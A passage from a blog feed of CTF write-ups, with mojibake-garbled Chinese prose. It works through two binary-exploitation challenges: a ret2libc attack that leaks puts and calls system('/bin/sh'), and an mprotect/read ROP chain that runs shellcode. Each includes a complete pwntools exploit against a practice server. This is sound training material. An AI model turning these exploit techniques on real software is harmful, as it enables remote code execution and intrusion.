    <published>2023-04-05T11:41:24.110Z</published>
    <updated>2023-04-09T06:23:22.396Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ÂâçË®Ä">ÂâçË®Ä</h2><p>ret2libc3Âä†‰∏ä‰∏Ä‰∏™<code>strlen()</code>ÈÅáÂà∞‚Äô<code>\x00'</code>Â∞±‰ºöÂÅú‰∏ãÁöÑÁü•ËØÜÁÇπ,ËøòÊòØÊúâ‰∏Ä‰∫õÁªÜËäÇË¶ÅÊ≥®ÊÑèÁöÑ.</p><h2 id="1-‰º™‰ª£Á†Å">1.‰º™‰ª£Á†Å</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">encrypt</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="type">unsigned</span> <span class="type">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span> )</span><br><span class="line">          s[x] ^= <span class="number">0xC</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[x] ^= <span class="number">0xD</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      s[x] ^= <span class="number">0xE</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    ++x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ciphertext&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">begin</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;====================================================================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Encrypt&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Decrypt&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Exit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Input your choice!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEEEE                            hh      iii                &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;====================================================================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to this Encryption machine\n&quot;</span>);</span><br><span class="line">  begin();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      fflush(<span class="number">0LL</span>);</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;I think you can do it by yourself&quot;</span>);</span><br><span class="line">      begin();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    encrypt();</span><br><span class="line">    begin();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Something Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-ÊºèÊ¥ûÂàÜÊûê">2.ÊºèÊ¥ûÂàÜÊûê</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>ÊÉØ‰æãchecksec,Âè™ÂºÄÂêØ‰∫ÜNXÂíåÈÉ®ÂàÜRELRO,ASLR‰∏ÄËà¨‰πüÈªòËÆ§ÂºÄÂêØ,ÁúÅ‰∫ÜÂæàÂ§ö‰∫ã.Á®ãÂ∫èÁõ∏ÂØπÊúâ‰∏Ä‰∫õÂ§çÊùÇ,Â§ßÊ¶ÇÂäüËÉΩÊòØÂä†ÂØÜÂ≠óÁ¨¶‰∏≤ÁÑ∂ÂêéÊâìÂç∞Âá∫Êù•,‰πüÂè™ÊúâËøô‰∏Ä‰∏™ÂäüËÉΩ,Âè™Êúâ<code>encrypt()</code>ÂÜÖÈÉ®Êúâ<code>gets()</code>Âíå<code>puts()</code>ÁöÑÊºèÊ¥ûÂèØ‰ª•‰ΩøÁî®,‰∏∫‰∫ÜÈÅøÂÖçÊûÑÈÄ†Ê†àÊ∫¢Âá∫ÊºèÊ¥ûÁöÑÊó∂ÂÄôpayloadË¢´Á†¥Âùè,ÊâÄ‰ª•Áî®‰∏ãÈù¢ÁöÑ‰∏Ä‰∏™Âà§Êñ≠:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>Êàë‰ª¨ËÆ©payload,ËÆæÁΩÆÊàê<code>'\x00'</code>ÂºÄÂ§¥Â∞±ÂèØ‰ª•Ë∑≥ËøáÂä†ÂØÜÊ£ÄÊü•‰∫Ü,ÂêéÈù¢ÁöÑËé∑ÂèñshellÁöÑpayload‰πüÊòØ‰∏ÄÊ®°‰∏ÄÊ†∑.</p><p>Êé•‰∏ãÊù•Â∞±ÊòØÂà©Áî®<code>gets()</code>Âíå<code>puts()</code>Êù•Ê≥ÑÈú≤Âá∫gotË°®ÈáåÁöÑÂáΩÊï∞ÁúüÂÆûÂú∞ÂùÄ(<code>puts()</code>ÈÄöËøáËß£ÊûêgotË°®È°πÁöÑÂú∞ÂùÄÁÑ∂ÂêéÊâìÂç∞Âá∫Êù•),ËøôÈáåËøòÈúÄË¶ÅË∞ÉËØïËé∑ÂæóÊ≠£Á°ÆÁöÑÂú∞ÂùÄ,Â§ßÊ¶ÇÊòØ<code>0x7f</code>ÂºÄÂ§¥.</p><p>ÁÑ∂ÂêéÂ∞±ÊòØLibcSearcherÊù•ÊâæglibcÁâàÊú¨,ËøôÈáåÊ≥®ÊÑèlibcÁî®dumpÊñπÊ≥ïÊù•ÊâæÂ≠ó‰∏≤Áî®ÁöÑÊòØ‚Äôstr_bin_sh‚ÄôËøô‰∏™.ÁÑ∂ÂêéÂÜçËøîÂõû<code>main()</code>ÂíåÂä†ÂØÜÂáΩÊï∞,ÂÜçÊûÑÈÄ†payloadË∑≥ËøáÂä†ÂØÜ,Ë¶ÜÁõñËøîÂõûÂú∞ÂùÄ‰∏∫<code>system(&quot;bin/sh&quot;)</code>Ëé∑Âæóshell.</p><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28118</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b main&#x27;)</span></span><br><span class="line">offset=<span class="number">0x50</span>+<span class="number">0x8</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_ret=<span class="number">0x400c83</span></span><br><span class="line">main=<span class="number">0x400b28</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>+cyclic(offset-<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_ret)+p64(puts_got)+p64(puts_plt)</span><br><span class="line">payload+=p64(main)</span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;choice!&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line">io.recv(<span class="number">1</span>) </span><br><span class="line">puts_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) </span><br><span class="line"><span class="comment">#recv(8)‰ºöÊääÂêéÈù¢ÁöÑ‰∏úË•ø‰πüËØªËøõÂéª,ËøôÈáårecvË∞ÉËØïÂà∞Âú∞ÂùÄÂºÄÂ§¥ÊòØ7fÂ∞±Â∑Æ‰∏çÂ§ö‰∫Ü,</span></span><br><span class="line"><span class="comment">#ÊúâÊïàÂú∞ÂùÄ‰∏ÄËà¨‰πüÂ∞±12‰ΩçÁöÑ16ËøõÂà∂Â§ßÂ∞è</span></span><br><span class="line">info(<span class="string">&#x27;puts:&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(puts_addr)))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) <span class="comment">#libcÂÜÖÊâæÂ≠óÁ¨¶‰∏≤Áî®ÁöÑÊñπÊ≥ï,Êñ∞‰∏úË•ø</span></span><br><span class="line">ret=<span class="number">0x04006b9</span> <span class="comment">#‰∏∫‰∫ÜÊ†àÂπ≥Ë°°ÊâãÂä®Âá∫Ê†à‰∏Ä‰∏™</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>+cyclic(offset-<span class="number">1</span>)+p64(ret)</span><br><span class="line">payload+=p64(pop_ret)+p64(bin_sh)+p64(system)</span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;choice!&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ÂâçË®Ä&quot;&gt;ÂâçË®Ä&lt;/h2&gt;
&lt;p&gt;ret2libc3Âä†‰∏ä‰∏Ä‰∏™&lt;code&gt;strlen()&lt;/code&gt;ÈÅáÂà∞‚Äô&lt;code&gt;\x00&#39;&lt;/code&gt;Â∞±‰ºöÂÅú‰∏ãÁöÑÁü•ËØÜÁÇπ,ËøòÊòØÊúâ‰∏Ä‰∫õÁªÜËäÇË¶ÅÊ≥®ÊÑèÁöÑ.&lt;/p&gt;
&lt;h2 id=&quot;1-‰º™‰ª£Á†Å&quot;&gt;1.‰º™‰ª£Á†Å&lt;/h2&gt;
&lt;figure cl</summary>
      
    
    
    
    <category term="È¢òËß£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>get_started_3dsctf_2016Â§çÁé∞</title>
    <link href="https://www.fomal.cc/posts/b4e8d3.html"/>
    <id>https://www.fomal.cc/posts/b4e8d3.html</id>
    <published>2023-04-03T15:13:38.680Z</published>
    <updated>2023-04-09T06:22:25.578Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ÊëòË¶Å">ÊëòË¶Å:</h2><p>ËøôÈ¢òÊ∂âÂèäÂà∞‰∫Üx86ÂáΩÊï∞Ë∞ÉÁî®Á∫¶ÂÆöÁöÑÂÜÖÂÆπ,Áî±‰∫éÈ¢ò‰∏ªÂØπcÂíåÊ±áÁºñ‰∫ÜËß£ÂæóÂπ∂Ê≤°ÊúâÈùûÂ∏∏Ê∑±ÂÖ•,ÂØºËá¥ÈÅáÂà∞‰∫ÜÁÅ∞Â∏∏Â§öÁöÑÂõ∞Èöæüò≠,Êï¥Âêà‰∫ÜÂæàÂ§öÂ∏àÂÇÖÁöÑÈ¢òËß£,Áü•ËØÜÁÇπÊÄªÁªìÂú®ÊúÄÂêé.</p><h2 id="1-‰º™‰ª£Á†Å">1.‰º™‰ª£Á†Å</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">get_flag</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">814536271</span> &amp;&amp; a2 == <span class="number">425138641</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rt&quot;</span>);</span><br><span class="line">    v3 = getc(v2);</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">255</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = (<span class="type">char</span>)v3;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(v4);</span><br><span class="line">        v5 = getc(v2);</span><br><span class="line">        v4 = (<span class="type">char</span>)v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v5 != <span class="number">255</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(v2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">56</span>]; <span class="comment">// [esp+4h] [ebp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Qual a palavrinha magica? &quot;</span>, v4[<span class="number">0</span>]);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-ÊºèÊ¥ûÂàÜÊûê">2.ÊºèÊ¥ûÂàÜÊûê</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No  found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, <span class="keyword">for</span> GNU/Linux 2.6.32, not stripped</span><br></pre></td></tr></table></figure><p>Âè™ÂºÄÂêØ‰∫ÜNX‰øùÊä§,ËÄå‰∏îËøòÊòØÈùôÊÄÅÈìæÊé•,ÂèàÂ≠òÂú®‰∏Ä‰∏™Ê†àÊ∫¢Âá∫ÁöÑÊºèÊ¥û,ÂíåÂêéÈó®ÂáΩÊï∞.ÂÖàÂÖ•‰∏∫‰∏ªÊÉ≥ÊûÑÈÄ†Ê†àÊ∫¢Âá∫ÊºèÊ¥ûË∑≥ËΩ¨Âà∞ÂêéÈó®ÂáΩÊï∞ÊâìÂç∞Âá∫flag,‰ΩÜÊòØÂú®Áî®pythonÂëΩ‰ª§Ë°åÊ®°ÂºèÊµãËØïÁöÑÊó∂ÂÄôÂèëÁé∞Á®ãÂ∫èÂπ∂‰∏ç‰ºöÂÆûÊó∂ËæìÂá∫,‰πüÂ∞±ÊòØË¶ÅÂú®Á®ãÂ∫èÂÖ≥Èó≠ÁöÑÊó∂ÂÄôÊâç‰ºöËæìÂá∫.‰∏çËøáËøô‰∏™Êó†‰º§Â§ßÈõÖ,Áúã‰∫Ü‰∏Ä‰∏ã<code>main</code>ÁöÑÊ±áÁºñ:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public _start</span><br><span class="line">_start proc near</span><br><span class="line">xor     ebp, ebp</span><br><span class="line">pop     esi</span><br><span class="line">mov     ecx, esp</span><br><span class="line">and     esp, 0FFFFFFF0h</span><br><span class="line">push    eax</span><br><span class="line">push    esp             ; stack_end</span><br><span class="line">push    edx             ; rtld_fini</span><br><span class="line">push    offset __libc_csu_fini ; fini</span><br><span class="line">push    offset __libc_csu_init ; init</span><br><span class="line">push    ecx             ; ubp_av</span><br><span class="line">push    esi             ; argc</span><br><span class="line">push    offset main     ; main</span><br><span class="line">call    __libc_start_main</span><br></pre></td></tr></table></figure><p>Âú®Ë∞ÉÁî®<code>main</code>Êó∂Êää<code>ebp</code>ÂÖàÊ∏ÖÈõ∂,ÁÑ∂ÂêéÂè™ÂéãÂÖ•‰∫Ü<code>esp</code>,‰πüÂ∞±ÊòØËØ¥Âú®<code>main</code>ÁöÑÊ†àÂ∏ßÈáå‰∏çÂ≠òÂú®ÊâÄË∞ìÁöÑ&quot;old ebp&quot;Ëøô‰∏ÄËØ¥,ÊâÄ‰ª•ËøôÈáåÁöÑIDAÁªôÂá∫ÁöÑÂÅèÁßªÈáèÁõ¥Êé•Áî®Â∞±Â•Ω‰∫Ü‰∏çÁî®Âä†0x4.Áî±‰∫éÁ®ãÂ∫èÊòØÈùôÊÄÅÈìæÊé•,Âπ∂‰∏îÂú®IDAÈáåËøòÊü•Âà∞‰∫Ü<code>mprotect()</code>ÂáΩÊï∞ÂèØ‰ª•Áõ¥Êé•ÊääÂÜÖÂ≠òÁöÑ‰∏ÄÊÆµËΩ¨Êç¢‰∏∫ÂèØËØªÂèØÂÜôÂèØÊâßË°å,PIE‰πüÊ≤°ÊúâÂºÄ,ÊâÄ‰ª•ÊÄùË∑Ø‰ª•ÂèäÂü∫Êú¨Êúâ‰∫Ü:</p><p>È¶ñÂÖàÊàë‰ª¨ÊûÑÈÄ†ROPÈìæ,ÂÖ∂‰∏≠ÂåÖÂê´‰∫Ü<code>mprotect()</code>Âíå<code>read()</code>,ÈÖçÂêà<code>pop ret</code>Êù•‰øùÊåÅÊ†àÂπ≥Ë°°‰ª•Â§öÊ¨°ÂÆûÁé∞ret(ËøôÈáåÊòØÁ¨îËÄÖÊúÄËøëÊâçËßÅÂà∞ÁöÑÊâãÊ≥ï),Áî®<code>read()</code>ÊääshellcodeËØªÂú®ËÆæÁΩÆÊàêÂèØ‰ª•ÊâßË°åÁöÑ.bssÊÆµÂå∫ÂüüÁÑ∂ÂêéËøîÂõûÂú∞ÂùÄÂ°´Âú®shellcodeÂ≠òÂÇ®ÁöÑÂú∞ÊñπÂ∞±ÂèØ‰ª•‰∫Ü,‰∏ãÈù¢ÊòØROPgadgetÁöÑ‰ΩøÁî®ÂÆû‰æã.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ./pwn --only <span class="string">&#x27;pop|ret&#x27;</span> |grep <span class="string">&#x27;pop&#x27;</span></span><br><span class="line">0x080483b8 : pop esi ; pop edi ; pop ebp ; ret</span><br></pre></td></tr></table></figure><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25712</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x38</span></span><br><span class="line">mprotect=elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">pop3_ret=<span class="number">0x080483b8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">bss=<span class="number">0x80ea000</span></span><br><span class="line">read=elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">shellcode_addr=<span class="number">0x080EA000</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)</span><br><span class="line">payload+=p32(mprotect)+p32(pop3_ret)+p32(bss)+p32(<span class="number">0x10000</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line">payload+=p32(read)+p32(pop3_ret)+p32(<span class="number">0x0</span>)+p32(bss)+p32(<span class="number">0x200</span>)</span><br><span class="line">payload+=p32(shellcode_addr)</span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 